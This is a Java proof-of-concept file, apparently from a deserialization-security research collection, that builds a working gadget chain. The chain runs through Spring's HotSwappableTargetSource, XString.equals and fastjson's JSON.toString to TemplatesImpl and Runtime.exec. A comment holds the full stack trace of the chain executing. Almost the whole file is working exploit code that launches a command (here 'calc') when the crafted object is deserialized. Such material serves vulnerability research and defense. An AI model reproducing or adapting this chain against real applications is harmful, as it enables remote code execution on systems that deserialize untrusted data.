package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.fasterxml.jackson.databind.node.POJONode;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.xml.transform.Templates;
import java.util.HashMap;

/**
 exec:347, Runtime (java.lang)
 <init>:-1, a
 newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 newInstance:422, Constructor (java.lang.reflect)
 newInstance:442, Class (java.lang)
 getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)
 write:251, MapSerializer (com.alibaba.fastjson.serializer)
 write:275, JSONSerializer (com.alibaba.fastjson.serializer)
 toJSONString:799, JSON (com.alibaba.fastjson)
 toString:793, JSON (com.alibaba.fastjson)
 equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 equals:104, HotSwappableTargetSource (org.springframework.aop.target)
 putVal:634, HashMap (java.util)
 readObject:1397, HashMap (java.util)
 invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 invoke:62, NativeMethodAccessorImpl (sun.reflect)
 invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 invoke:497, Method (java.lang.reflect)
 invokeReadObject:1058, ObjectStreamClass (java.io)
 readSerialData:1900, ObjectInputStream (java.io)
 readOrdinaryObject:1801, ObjectInputStream (java.io)
 readObject0:1351, ObjectInputStream (java.io)
 readObject:371, ObjectInputStream (java.io)
 base64deserial:66, SerializeUtils (com.javasec.utils)
 main:61, XstringTemplateChain (com.javasec.pocs.fastjson)
 * base64deserial:48, SerializeUtils (com.javasec.utils)
 * main:21, XstringTemplateChain (com.javasec.pocs.jackson)
 */
public class XstringTemplateChain {
    public static void main(String[] args) throws Exception{
        SerializeUtils.OverideJackson();
        Templates templates = SerializeUtils.getTemplate("calc");
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("pop",templates);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("123"));
        HotSwappableTargetSource h1 = new HotSwappableTargetSource(jsonObject);
        // 执行序列化与反序列化，并且返回序列化数据
        HashMap<Object, Object> map = SerializeUtils.makeMap(h1, h2);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(map));
    }
}
